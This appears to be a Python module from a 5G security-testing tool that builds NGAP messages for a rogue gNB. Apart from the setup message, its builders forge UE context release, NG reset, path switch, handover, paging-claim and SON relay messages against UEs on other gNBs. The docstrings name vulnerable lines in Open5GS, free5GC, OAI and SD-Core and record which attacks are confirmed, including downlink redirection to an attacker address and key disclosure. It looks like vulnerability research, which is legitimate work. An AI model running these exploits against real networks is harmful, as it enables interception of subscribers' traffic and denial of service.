"""NGAP message builders (values for ngap.encode).

`ng_setup_request` is the only one needed to get accepted by the AMF. The rest
are the cross-gNB attack messages our source review confirmed; each takes the
victim identifiers the attacker supplies.

IE ids and open-type names follow TS 38.413 (id-* -> value-type):
  27 GlobalRANNodeID, 82 RANNodeName, 102 SupportedTAList, 21 PagingDRX(DefaultPagingDRX),
  85 RAN-UE-NGAP-ID, 10 AMF-UE-NGAP-ID, 15 Cause, 121 SourceAMF-UE-NGAP-ID? (see notes),
  88 ResetType, 19 PDUSessionResourceToBeSwitchedDLList, ...
"""
from __future__ import annotations

import socket


# ---------------------------------------------------------------- primitives
def ip_to_bits(ip: str):
    """IPv4 dotted string -> NGAP TransportLayerAddress BIT STRING (value, 32)."""
    return (int.from_bytes(socket.inet_aton(ip), "big"), 32)


def _teid(teid) -> bytes:
    """Coerce a TEID (int or 4 bytes/hex) to the 4-octet OCTET STRING NGAP wants."""
    if isinstance(teid, int):
        return teid.to_bytes(4, "big")
    if isinstance(teid, str):
        return bytes.fromhex(teid)
    return bytes(teid)


def _gtp_tunnel(ip: str, teid):
    return ("gTPTunnel", {
        "transportLayerAddress": ip_to_bits(ip),
        "gTP-TEID": _teid(teid),
    })


def encode_plmn(mcc: str, mnc: str) -> bytes:
    """3-octet PLMN Identity (TS 24.008), e.g. mcc=001 mnc=01 -> 00 f1 10."""
    mcc = str(mcc).zfill(3)
    mnc = str(mnc)
    d = lambda c: int(c)
    if len(mnc) == 2:
        return bytes([(d(mcc[1]) << 4) | d(mcc[0]),
                      (0xF << 4) | d(mcc[2]),
                      (d(mnc[1]) << 4) | d(mnc[0])])
    return bytes([(d(mcc[1]) << 4) | d(mcc[0]),
                  (d(mnc[0]) << 4) | d(mcc[2]),
                  (d(mnc[2]) << 4) | d(mnc[1])])


def _snssai(sst: int, sd: str | None):
    s = {"sST": bytes([sst])}
    if sd:
        s["sD"] = bytes.fromhex(sd)
    return s


# ---------------------------------------------------------------- NG Setup
def ng_setup_request(cfg: dict):
    plmn = encode_plmn(cfg["mcc"], cfg["mnc"])
    tac = int(cfg["tac"]).to_bytes(3, "big")
    gnb_id_len = int(cfg.get("gnb_id_len", 32))
    ies = [
        {"id": 27, "criticality": "reject",
         "value": ("GlobalRANNodeID", ("globalGNB-ID", {
             "pLMNIdentity": plmn,
             "gNB-ID": ("gNB-ID", (int(cfg["gnb_id"]), gnb_id_len)),
         }))},
        {"id": 82, "criticality": "ignore",
         "value": ("RANNodeName", cfg.get("ran_node_name", "ngap-tester"))},
        {"id": 102, "criticality": "reject",
         "value": ("SupportedTAList", [
             {"tAC": tac, "broadcastPLMNList": [
                 {"pLMNIdentity": plmn, "tAISliceSupportList": [
                     {"s-NSSAI": _snssai(int(cfg["sst"]), cfg.get("sd"))},
                 ]},
             ]},
         ])},
        {"id": 21, "criticality": "ignore",
         "value": ("PagingDRX", cfg.get("paging_drx", "v128"))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 21, "criticality": "reject",
        "value": ("NGSetupRequest", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- attacks
def ue_context_release_request(amf_ue_id: int, ran_ue_id: int,
                               cause=("radioNetwork", "user-inactivity"),
                               pdu_sessions: tuple | list | None = None):
    """UE CONTEXT RELEASE REQUEST (Class 2).

    Forges a victim AMF-UE-NGAP-ID to make the AMF release a remote UE.
    Default cause = radioNetwork/user-inactivity, the standard gNB-initiated
    AN-Release trigger (TS 23.502 4.2.6); a real serving gNB never sends
    'unspecified' here.

    Optional `pdu_sessions`: include IE PDUSessionResourceListCxtRelReq (id 133).
    free5GC only calls SMF DeactivateUpCnxState (Buff+NOCP → idle paging path)
    when this list is present on the Request (and again on Complete).

    Status: source review shows SD-Core lacks the sender-binding guard that
    Open5GS (ngap-handler.c:1784) and free5GC (ranUe.Ran != ran) enforce, so
    those two reject it. End-to-end victim impact on SD-Core is NOT yet cleanly
    reproduced (see pcap/sdcore_T06 audit); do not label 'confirmed'.
    """
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 15, "criticality": "ignore", "value": ("Cause", cause)},
    ]
    if pdu_sessions:
        ies.append({
            "id": 133, "criticality": "reject",
            "value": ("PDUSessionResourceListCxtRelReq",
                      [{"pDUSessionID": int(pid)} for pid in pdu_sessions]),
        })
    return ("initiatingMessage", {
        "procedureCode": 42, "criticality": "ignore",
        "value": ("UEContextReleaseRequest", {"protocolIEs": ies}),
    })


def ue_context_release_complete(amf_ue_id: int, ran_ue_id: int,
                                pdu_sessions: tuple | list | None = None):
    """UE CONTEXT RELEASE COMPLETE (successfulOutcome of procedureCode 41).

    Completes the AMF-initiated UE Context Release Command handshake. free5GC
    finishes N2 detach / (re)deactivation in handleUEContextReleaseCompleteMain;
    without this reply the attacker association just dies and the idle+Buff path
    is incomplete.
    """
    ies = [
        {"id": 10, "criticality": "ignore", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "ignore", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
    ]
    if pdu_sessions:
        # id-PDUSessionResourceListCxtRelCpl = 116
        ies.append({
            "id": 116, "criticality": "reject",
            "value": ("PDUSessionResourceListCxtRelCpl",
                      [{"pDUSessionID": int(pid)} for pid in pdu_sessions]),
        })
    return ("successfulOutcome", {
        "procedureCode": 41, "criticality": "reject",
        "value": ("UEContextReleaseComplete", {"protocolIEs": ies}),
    })


def error_indication(amf_ue_id: int | None = None, ran_ue_id: int | None = None,
                     cause=("radioNetwork", "unknown-local-UE-NGAP-ID")):
    """ERROR INDICATION (Class 2), UE-associated variant.

    Default cause = radioNetwork/unknown-local-UE-NGAP-ID, the canonical cause
    a node reports when a UE-associated message references a UE NGAP ID it
    cannot map (TS 38.413 8.7 Error Indication); 'unspecified' does not fit
    this procedure.

    Status: Open5GS handles this unbound -- ran_ue_find_by_amf_ue_ngap_id with
    NO gnb-binding guard (ngap-handler.c:5358) then a local release
    (deactivate-all-sessions + ran_ue_remove, :5429/:5437). This differs from
    UEContextReleaseRequest, which Open5GS DOES bind (:1784). End-to-end victim
    impact is NOT yet cleanly reproduced; do not label 'confirmed'.
    """
    ies = []
    if amf_ue_id is not None:
        ies.append({"id": 10, "criticality": "ignore", "value": ("AMF-UE-NGAP-ID", amf_ue_id)})
    if ran_ue_id is not None:
        ies.append({"id": 85, "criticality": "ignore", "value": ("RAN-UE-NGAP-ID", ran_ue_id)})
    ies.append({"id": 15, "criticality": "ignore", "value": ("Cause", cause)})
    return ("initiatingMessage", {
        "procedureCode": 9, "criticality": "ignore",
        "value": ("ErrorIndication", {"protocolIEs": ies}),
    })


def ng_reset_partial(ue_pairs, cause=("misc", "om-intervention")):
    """NG RESET (Class 1), Reset Type = partOfNG-Interface.

    ue_pairs: list of (amf_ue_id, ran_ue_id). Confirmed cross-gNB on Open5GS/OAI:
    listing victim AMF-UE-NGAP-IDs tears down UEs on other gNBs.
    Pass ran_ue_id=None to send ONLY the AMF-UE-NGAP-ID — this forces the handler
    onto the unbound global (AMF-UE-ID) resolution path instead of the gNB-scoped
    RAN-UE-ID path, which is the actually-vulnerable route on free5gc-family stacks.
    """
    part = []
    for amf_ue_id, ran_ue_id in ue_pairs:
        item = {"aMF-UE-NGAP-ID": amf_ue_id}
        if ran_ue_id is not None:
            item["rAN-UE-NGAP-ID"] = ran_ue_id
        part.append(item)
    ies = [
        {"id": 15, "criticality": "ignore", "value": ("Cause", cause)},
        {"id": 88, "criticality": "reject",
         "value": ("ResetType", ("partOfNG-Interface", part))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 20, "criticality": "reject",
        "value": ("NGReset", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- Path Switch
# Needs the nested PathSwitchRequestTransfer, encoded separately, then carried as
# an OCTET STRING. The codec module owns the ASN.1 type; we import lazily to keep
# this file pure-data where possible.
def _ue_security_capabilities(nea: int = 0x8000, nia: int = 0x8000):
    """UESecurityCapabilities. Bit0 (MSB) = NEA0/NIA0 support. 0x8000 => NEA0/NIA0
    only, which every AMF accepts; the value is attacker-asserted anyway."""
    return {
        "nRencryptionAlgorithms": (nea, 16),
        "nRintegrityProtectionAlgorithms": (nia, 16),
        "eUTRAencryptionAlgorithms": (0, 16),
        "eUTRAintegrityProtectionAlgorithms": (0, 16),
    }


def _uli_nr(cfg: dict, nci: int | None = None):
    """UserLocationInformation (NR): the cell/TAI the attacker claims to serve."""
    plmn = encode_plmn(cfg["mcc"], cfg["mnc"])
    tac = int(cfg["tac"]).to_bytes(3, "big")
    if nci is None:
        nci = int(cfg.get("nci", 0x10))
    return ("userLocationInformationNR", {
        "nR-CGI": {"pLMNIdentity": plmn, "nRCellIdentity": (nci, 36)},
        "tAI": {"pLMNIdentity": plmn, "tAC": tac},
    })


def path_switch_request_transfer(attacker_ip: str, teid=1, qfis=(1,)):
    """Encode the RAN-side PathSwitchRequestTransfer (attacker DL N3 endpoint).

    Returned as APER bytes, to be embedded as the OCTET STRING carrier IE.
    """
    from .ngap import encode_transfer
    val = {
        "dL-NGU-UP-TNLInformation": _gtp_tunnel(attacker_ip, teid),
        "qosFlowAcceptedList": [{"qosFlowIdentifier": q} for q in qfis],
    }
    return encode_transfer("PathSwitchRequestTransfer", val)


def path_switch_request(source_amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                        pdu_sessions=(1,), attacker_ip: str = "127.0.0.1",
                        teid=1, qfis=(1,), include_uli: bool = True,
                        include_seccap: bool = True, nci: int | None = None,
                        nea: int = 0x8000, nia: int = 0x8000):
    """PATH SWITCH REQUEST (Class 1). Open5GS 2.8.0: CONFIRMED cross-gNB disclosure.

    Locating the victim by `Source AMF-UE-NGAP-ID` alone (no originating-gNB
    binding — ngap-handler.c:3074), the AMF switches the victim's DL N3 path to
    `attacker_ip`/`teid` and returns {NH, NCC} + the UPF N3 TEID in the ACK.
    `pdu_sessions` are the victim PDU Session IDs to switch (each carries our
    DL tunnel). Reply decoded by ngaptester.decode.path_switch_ack_leak().
    """
    transfer = path_switch_request_transfer(attacker_ip, teid, qfis)
    switched = [{"pDUSessionID": int(pid), "pathSwitchRequestTransfer": transfer}
                for pid in pdu_sessions]
    ies = [
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 100, "criticality": "reject",
         "value": ("AMF-UE-NGAP-ID", source_amf_ue_id)},
    ]
    if include_uli:
        ies.append({"id": 121, "criticality": "ignore",
                    "value": ("UserLocationInformation", _uli_nr(cfg, nci))})
    if include_seccap:
        ies.append({"id": 119, "criticality": "ignore",
                    "value": ("UESecurityCapabilities",
                              _ue_security_capabilities(nea, nia))})
    ies.append({"id": 76, "criticality": "reject",
                "value": ("PDUSessionResourceToBeSwitchedDLList", switched)})
    return ("initiatingMessage", {
        "procedureCode": 25, "criticality": "reject",
        "value": ("PathSwitchRequest", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- Handover Required
def _global_gnb_id(cfg: dict, gnb_id: int, gnb_id_len: int = 32):
    return ("globalGNB-ID", {
        "pLMNIdentity": encode_plmn(cfg["mcc"], cfg["mnc"]),
        "gNB-ID": ("gNB-ID", (int(gnb_id), gnb_id_len)),
    })


def handover_required(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                      target_gnb_id: int, pdu_sessions=(1,),
                      cause=("radioNetwork", "handover-desirable-for-radio-reason"),
                      src2tgt_container: bytes = b"\x00"):
    """HANDOVER REQUIRED (Class 1). Open5GS 2.8.0: CONFIRMED cross-gNB.

    Locates the victim by `AMF-UE-NGAP-ID` alone (ngap-handler.c:3519, no gNB
    binding) and forces relocation toward `target_gnb_id`. Disclosure (NH/NCC/N3)
    only if the attacker also controls the *named target* gNB; otherwise it is a
    mobility/DoS primitive against a UE served by another gNB.
    """
    tac = int(cfg["tac"]).to_bytes(3, "big")
    target = ("targetRANNodeID", {
        "globalRANNodeID": _global_gnb_id(cfg, target_gnb_id),
        "selectedTAI": {"pLMNIdentity": encode_plmn(cfg["mcc"], cfg["mnc"]),
                        "tAC": tac},
    })
    ho_list = [{"pDUSessionID": int(pid),
                "handoverRequiredTransfer": _handover_required_transfer()}
               for pid in pdu_sessions]
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 29, "criticality": "reject", "value": ("HandoverType", "intra5gs")},
        {"id": 15, "criticality": "ignore", "value": ("Cause", cause)},
        {"id": 105, "criticality": "reject", "value": ("TargetID", target)},
        {"id": 61, "criticality": "reject",
         "value": ("PDUSessionResourceListHORqd", ho_list)},
        {"id": 101, "criticality": "reject",
         "value": ("SourceToTarget-TransparentContainer", src2tgt_container)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 12, "criticality": "reject",
        "value": ("HandoverRequired", {"protocolIEs": ies}),
    })


def handover_request_acknowledge(amf_ue_id: int, ran_ue_id: int, *,
                                 pdu_sessions=(1,),
                                 attacker_ip: str = "127.0.0.1",
                                 teid=1, qfis=(1,),
                                 tgt2src_container: bytes = b"\x00"):
    """HANDOVER REQUEST ACKNOWLEDGE (Class 1, procedureCode 13).

    Target-side reply that completes N2 handover *preparation*. Used by the
    HO-window injector: after a forged HandoverRequired names this FakeGNB as
    TargetID, the AMF sends HandoverRequest here; acknowledging it (and later
    injecting p21/p09) exercises the mid-handover gate that idle p09/p21 hit.
    Mandatory IEs: AMF/RAN-UE-NGAP-ID, PDUSessionResourceAdmittedList (53),
    TargetToSource-TransparentContainer (106)."""
    from .ngap import encode_transfer
    transfer = encode_transfer("HandoverRequestAcknowledgeTransfer", {
        "dL-NGU-UP-TNLInformation": _gtp_tunnel(attacker_ip, teid),
        "qosFlowSetupResponseList": [
            {"qosFlowIdentifier": int(q)} for q in qfis
        ],
    })
    admitted = [{"pDUSessionID": int(pid),
                 "handoverRequestAcknowledgeTransfer": transfer}
                for pid in pdu_sessions]
    ies = [
        {"id": 10, "criticality": "ignore", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "ignore", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 53, "criticality": "ignore",
         "value": ("PDUSessionResourceAdmittedList", admitted)},
        {"id": 106, "criticality": "reject",
         "value": ("TargetToSource-TransparentContainer", tgt2src_container)},
    ]
    return ("successfulOutcome", {
        "procedureCode": 13, "criticality": "reject",
        "value": ("HandoverRequestAcknowledge", {"protocolIEs": ies}),
    })


def _handover_required_transfer():
    from .ngap import encode_transfer
    return encode_transfer("HandoverRequiredTransfer",
                           {"directForwardingPathAvailability": "direct-path-available"})


# ---------------------------------------------------------------- Topology-trust surface
# These abuse "missing topology/relay trust" (independent of the UE-context binding
# above): a rogue gNB advertises a TAI it doesn't own, or blind-relays SON config.
def _supported_ta_list(cfg: dict, tac=None):
    plmn = encode_plmn(cfg["mcc"], cfg["mnc"])
    tac_b = int(cfg["tac"] if tac is None else tac).to_bytes(3, "big")
    return [
        {"tAC": tac_b, "broadcastPLMNList": [
            {"pLMNIdentity": plmn, "tAISliceSupportList": [
                {"s-NSSAI": _snssai(int(cfg["sst"]), cfg.get("sd"))},
            ]},
        ]},
    ]


def ran_configuration_update(cfg: dict, *, tac=None, ran_node_name: str = "ngap-tester"):
    """RAN CONFIGURATION UPDATE (Class 1, procedureCode 35). Open5GS g02: CONFIRMED.

    Re-advertises this rogue gNB's SupportedTAList to *claim a victim TAI it does not
    own*. The AMF updates the gNB's served-TAI set; subsequent TAI-matched PAGING
    (victim 5G-S-TMSI) then fans out to this gNB too -> paging interception.
    `tac` overrides cfg['tac'] to claim an arbitrary victim TAC.
    """
    ies = [
        {"id": 82, "criticality": "ignore", "value": ("RANNodeName", ran_node_name)},
        {"id": 102, "criticality": "reject",
         "value": ("SupportedTAList", _supported_ta_list(cfg, tac))},
        {"id": 21, "criticality": "ignore",
         "value": ("PagingDRX", cfg.get("paging_drx", "v128"))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 35, "criticality": "reject",
        "value": ("RANConfigurationUpdate", {"protocolIEs": ies}),
    })


def uplink_ran_configuration_transfer(cfg: dict, *, target_gnb_id: int,
                                      source_gnb_id: int | None = None, tac=None):
    """UPLINK RAN CONFIGURATION TRANSFER (Class 2, procedureCode 48). Open5GS g09.

    Blind relay: the AMF forwards the carried SONConfigurationTransfer to the
    attacker-named `target_gnb_id` (DOWNLINK RAN CONFIGURATION TRANSFER), with no
    check that source/target are real neighbours -> inject SON/Xn config toward a
    victim gNB the attacker does not control.
    """
    plmn = encode_plmn(cfg["mcc"], cfg["mnc"])
    tac_b = int(cfg["tac"] if tac is None else tac).to_bytes(3, "big")
    tai = {"pLMNIdentity": plmn, "tAC": tac_b}
    if source_gnb_id is None:
        source_gnb_id = int(cfg.get("gnb_id", 4660))
    son = {
        "targetRANNodeID-SON": {"globalRANNodeID": _global_gnb_id(cfg, target_gnb_id),
                                "selectedTAI": tai},
        "sourceRANNodeID": {"globalRANNodeID": _global_gnb_id(cfg, source_gnb_id),
                            "selectedTAI": tai},
        "sONInformation": ("sONInformationRequest", "xn-TNL-configuration-info"),
    }
    ies = [
        {"id": 99, "criticality": "ignore",
         "value": ("SONConfigurationTransfer", son)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 48, "criticality": "ignore",
        "value": ("UplinkRANConfigurationTransfer", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- More UE-associated
# procedures (source-flagged on OAI/SD-Core). All locate the UE by AMF-UE-NGAP-ID;
# where the message needs an opaque container we send a minimal valid placeholder —
# the point is to exercise the (missing) sender binding, not carry real payloads.
def _nr_cgi(cfg: dict, nci: int | None = None):
    """NGRAN-CGI, nR-CGI branch (the cell the attacker claims to serve)."""
    if nci is None:
        nci = int(cfg.get("nci", 0x10))
    return ("nR-CGI", {"pLMNIdentity": encode_plmn(cfg["mcc"], cfg["mnc"]),
                       "nRCellIdentity": (nci, 36)})


def pdu_session_resource_notify(amf_ue_id: int, ran_ue_id: int, *,
                                pdu_sessions=(1,),
                                notify_transfer: bytes | None = None):
    """PDU SESSION RESOURCE NOTIFY (Class 2, procedureCode 30). SD-Core p06.

    Locates the victim by AMF-UE-NGAP-ID (unbound on SD-Core) then rebinds
    `ranUe.Ran = ran` before forwarding the notify transfer to SMF. Spec lists
    both resource lists as optional, but SD-Core *requires*
    PDUSessionResourceNotifyList (IE id 66) and rejects otherwise — include a
    minimal NotifyList so the unbound lookup / rebind path is actually reached.
    `notify_transfer` is the opaque PDUSessionResourceNotifyTransfer OCTET STRING
    (placeholder bytes are enough to pass the IE gate; SMF may still NACK)."""
    if notify_transfer is None:
        notify_transfer = b"\x00"
    notify_list = [
        {"pDUSessionID": int(pid),
         "pDUSessionResourceNotifyTransfer": notify_transfer}
        for pid in pdu_sessions
    ]
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 66, "criticality": "reject",
         "value": ("PDUSessionResourceNotifyList", notify_list)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 30, "criticality": "ignore",
        "value": ("PDUSessionResourceNotify", {"protocolIEs": ies}),
    })


def handover_notify(amf_ue_id: int, ran_ue_id: int, cfg: dict, *, nci: int | None = None):
    """HANDOVER NOTIFY (Class 2, procedureCode 11). OAI p09.

    Signals 'handover complete' for a victim located by AMF-UE-NGAP-ID; on stacks
    that rebind the serving gNB from this (OAI) it redirects the victim's downlink
    to the attacker. UserLocationInformation is mandatory."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 121, "criticality": "ignore",
         "value": ("UserLocationInformation", _uli_nr(cfg, nci))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 11, "criticality": "ignore",
        "value": ("HandoverNotify", {"protocolIEs": ies}),
    })


def uplink_ue_associated_nrppa_transport(amf_ue_id: int, ran_ue_id: int, *,
                                         routing_id: bytes = b"\x00\x00",
                                         nrppa_pdu: bytes = b"\x00"):
    """UPLINK UE-ASSOCIATED NRPPa TRANSPORT (Class 2, procedureCode 50). OAI p16.

    Injects an attacker-chosen NRPPa PDU into the victim UE's LMF positioning
    session, located by AMF-UE-NGAP-ID. RoutingID + NRPPa-PDU are opaque OCTET
    STRINGs (placeholders here)."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 89, "criticality": "reject", "value": ("RoutingID", routing_id)},
        {"id": 46, "criticality": "reject", "value": ("NRPPa-PDU", nrppa_pdu)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 50, "criticality": "reject",
        "value": ("UplinkUEAssociatedNRPPaTransport", {"protocolIEs": ies}),
    })


def cell_traffic_trace(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                       trace_id: bytes = b"\x00" * 8, tce_ip: str = "127.0.0.1",
                       nci: int | None = None):
    """CELL TRAFFIC TRACE (Class 2, procedureCode 2). SD-Core p17.

    Locates the victim by AMF-UE-NGAP-ID and (on SD-Core) rebinds + corrupts its
    trace state; the TraceCollectionEntity IP is attacker-chosen. NGRANTraceID is
    an 8-octet OCTET STRING, NGRAN-CGI the claimed cell, TCE-IP a BIT STRING addr."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 44, "criticality": "ignore", "value": ("NGRANTraceID", trace_id)},
        {"id": 43, "criticality": "ignore", "value": ("NGRAN-CGI", _nr_cgi(cfg, nci))},
        {"id": 109, "criticality": "ignore",
         "value": ("TransportLayerAddress", ip_to_bits(tce_ip))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 2, "criticality": "ignore",
        "value": ("CellTrafficTrace", {"protocolIEs": ies}),
    })


def _drb_status_item(drb_id: int = 1):
    """Minimal DRBsSubjectToStatusTransferItem (18-bit PDCP SN COUNT variant)."""
    zero_count = {"pDCP-SN18": 0, "hFN-PDCP-SN18": 0}
    return {
        "dRB-ID": int(drb_id),
        "dRBStatusUL": ("dRBStatusUL18", {"uL-COUNTValue": zero_count}),
        "dRBStatusDL": ("dRBStatusDL18", {"dL-COUNTValue": zero_count}),
    }


def uplink_ran_status_transfer(amf_ue_id: int, ran_ue_id: int, *, drb_id: int = 1):
    """UPLINK RAN STATUS TRANSFER (Class 2, procedureCode 49). OAI p21.

    Carries a PDCP status container for a victim located by AMF-UE-NGAP-ID; on OAI
    the unbound lookup lets it corrupt a remote UE's handover PDCP state (gated by
    the victim being mid-handover). The transparent container needs >=1 DRB item."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 84, "criticality": "reject",
         "value": ("RANStatusTransfer-TransparentContainer",
                   {"dRBsSubjectToStatusTransferList": [_drb_status_item(drb_id)]})},
    ]
    return ("initiatingMessage", {
        "procedureCode": 49, "criticality": "ignore",
        "value": ("UplinkRANStatusTransfer", {"protocolIEs": ies}),
    })
